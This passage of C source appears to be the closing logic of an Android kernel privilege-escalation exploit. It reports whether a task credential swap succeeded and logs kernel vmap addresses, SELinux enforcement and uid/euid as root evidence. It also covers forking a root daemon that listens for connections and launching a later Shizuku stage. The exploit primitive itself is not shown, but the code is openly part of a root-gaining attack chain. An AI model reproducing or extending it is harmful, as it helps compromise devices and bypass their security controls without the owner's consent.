        L("device: cred swap did not take effect on this task; delivery skipped");
        return 2;
    }
    if (delivery(&C) != 0) {
        char e[32];
        e[0] = 0;
        if (rd_file("/sys/fs/selinux/enforce", e, sizeof(e)) < 0) snprintf(e, sizeof(e), "?");
        L("DELIVERY_FAIL round=%d shots=%d fails=%d enforce=%s vr=%s vr_ab=%s "
          "c1_shell=%s post=%d", g_round, g_shots, g_fails, e, g_vr_verdict,
          g_vr_ab, g_c1_shell, g_c1_post);
        /* i775: Phase A's real deliverable (uid0) and Phase B's real
         * deliverable (LISTENING uid0) are independently useful; a later
         * evidence failure must not take the daemon down. */
        zd_persist_note("delivery_evidence_fail");
        return 2;
    }
    /* glx_p11i (intent 744): single-run A -> B -> stage 3.  delivery()
     * above is Phase B (fork rootd + optional 10369 client selftest); only
     * now does the deferred stage 3 fork+exec app_process.  Stage 3 is
     * still gated solely by --stop-after=shzlaunch|shzcheck. */
    if (g_shz_after_deliver &&
        (PERM_STAGE("shzlaunch") || PERM_STAGE("shzcheck"))) {
        int src = stage3_shizuku();
        printf("GLX|SHZ_AFTER_DELIVER|%s rc=%d\n",
               src == 0 ? "PASS" : "FAIL", src);
        fflush(stdout);
        if (src != 0) {
            L("DELIVERY_STAGE3_FAIL rc=%d (Phase A+B evidence above is "
              "intact; the stage-3 failure face is in the SHZ lines)", src);
            zd_persist_note("stage3_fail");
            if (g_log) fclose(g_log);
            return 2;
        }
        L("STOP_AFTER=%s (deferred after delivery): Phase A + Phase B + "
          "stage 3 completed in ONE run", g_stop_after);
        printf("GLX|STOP_AFTER=%s|PASS round=%d shots=%d uid=%d euid=%d "
               "delivery=verified stage3=ran\n", g_stop_after, g_round,
               g_shots, getuid(), geteuid());
        zd_persist_note("run_complete");
        if (g_log) fclose(g_log);
        return g_fails ? 1 : 0;
    }
    if (g_stop_hit) {
        printf("GLX|STOP_AFTER=%s|PASS round=%d shots=%d uid=%d euid=%d "
               "vr=SKIPPED (delivery channel verified only; no root claim)\n",
               g_stop_after, g_round, g_shots, getuid(), geteuid());
        zd_persist_note("stop_after_delivery");
        if (g_log) fclose(g_log);
        return g_fails ? 1 : 0;
    }
    /* P2: vr= is printed separately; only ROOTONLY counts as root evidence.
     * item ②: C1 is split into its evidence dimensions -- only c1_shell can be
     * LIVE (and only with a POST=0 report); kernel/init are STATIC by
     * construction (fact 593). */
    L("RESULT=PASS round=%d shots=%d fails=%d vmap_base=%016lx vmap_obj=%016lx "
      "vr=%s vr_ab=%s enforce=1 c1_shell=%s c1_kernel=STATIC c1_init=STATIC "
      "post=%d",
      g_round, g_shots, g_fails, g_vmap_base, g_vmap_obj, g_vr_verdict,
      g_vr_ab, g_c1_shell, g_c1_post);
    /* P2: machine-readable RESULT also carries the VR verdict in its own field
     * (only vr=ROOTONLY is root evidence; vr=UNKNOWN can never reach here).
     * item ②: C1 evidence dimensions are listed separately from the root gate.
     * item ④: vr_ab= carries the corrected pre/post A/B verdict (AB_FAIL is a
     * res(...,0) gate, so it can never reach a PASS line). */
    printf("GLX|RESULT=PASS round=%d shots=%d vr=%s vr_ab=%s enforce=1 "
           "c1_shell=%s c1_kernel=STATIC c1_init=STATIC post=%d\n",
           g_round, g_shots, g_vr_verdict, g_vr_ab, g_c1_shell, g_c1_post);
    zd_persist_note("run_complete");
    if (g_log) fclose(g_log);
    return 0;
}
